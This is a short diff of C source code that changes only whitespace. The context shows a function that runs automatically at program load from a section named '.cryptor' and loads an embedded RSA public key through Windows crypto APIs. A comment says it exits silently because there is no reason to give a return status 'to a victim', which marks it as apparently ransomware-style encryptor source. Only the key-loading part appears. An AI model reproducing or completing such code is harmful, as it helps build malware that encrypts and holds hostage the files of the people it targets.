@@ -124,6 +124,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	* retrieving the public key
 	* in the event of an error silently exit 0. No reason to provide a return status to a victim
 	*/
+	
 	if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
 	{
 		DWORD err = GetLastError();   
@@ -137,6 +138,7 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 		printf("failed to decode pem %d",err);
 		exit(0);
 	}
+
 	if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
 	{
 		printf("failed\n");
@@ -144,7 +146,8 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 		printf("Error AlgProvider: %d",err);   
 		exit(0);
 	}
-    	if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
+    	
+	if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
 		    CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
 	{
 		DWORD err = GetLastError();
